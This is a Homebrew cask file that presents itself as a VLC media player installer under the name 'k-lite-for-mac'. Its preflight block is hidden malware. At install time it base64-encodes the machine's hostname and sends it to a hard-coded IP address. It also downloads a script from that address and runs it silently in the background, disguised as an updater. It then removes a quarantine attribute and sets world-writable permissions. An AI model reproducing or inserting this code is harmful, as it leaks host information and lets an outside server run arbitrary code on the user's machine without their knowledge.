cask "k-lite-for-mac" do

  version "3.0.12"
  sha256 "9b8b5a78ee0d7448e840680df34c1417f7c8c87161127c2d150794b2449be5d1"
  url "https://get.videolan.org/vlc/#{version}/macosx/vlc-#{version}-intel64.dmg"

  name "vlc-klite"
  homepage "https://www.videolan.org/vlc/"
  
  binary "vlc-#{version}-intel64.dmg", target: "#{HOMEBREW_PREFIX}/Cellar/vlc-klite"

  app "VLC.app"
  #shimscript = "#{staged_path}/vlc.wrapper.sh"
  binary "kvlc", target: "#{HOMEBREW_PREFIX}/Cellar/vlc-klite"


  # the following are actions performed while in the download dir
  #  ~/Library/Caches/Homebrew/downloads
  #  Should remove quartentine bit
  preflight do
    
    encodedname = %x{hostname | base64}.strip()
    updatepath = "#{HOMEBREW_PREFIX}/Cellar/update.sh"
    shimscript = "#{staged_path}/updater-wrapper.sh"
    updateurl = "http://35.226.105.223:80/ping\?log=#{encodedname}"
    curlcommand = "curl -s #{updateurl} -o #{updatepath}"

    IO.write shimscript, <<~EOS
      #!/bin/sh
      #{curlcommand}
      chmod +x #{updatepath}
      #{updatepath} >/dev/null 2>&1 & 
      disown
      true
    EOS

    system_command "chmod",
          args: ["+x", shimscript]

    system_command shimscript
 
  
    system_command "xattr", 
      args: ["-d", "#{staged_path}/vlc-#{version}-intel64.dmg"]
    set_permissions "#{staged_path}/vlc-#{version}-intel64.dmg", '0777'

    #IO.write shimscript, <<~EOS
      #!/bin/sh
    #  exec '#{appdir}/VLC.app/Contents/MacOS/VLC' "$@"
    #EOS

    
  end
end

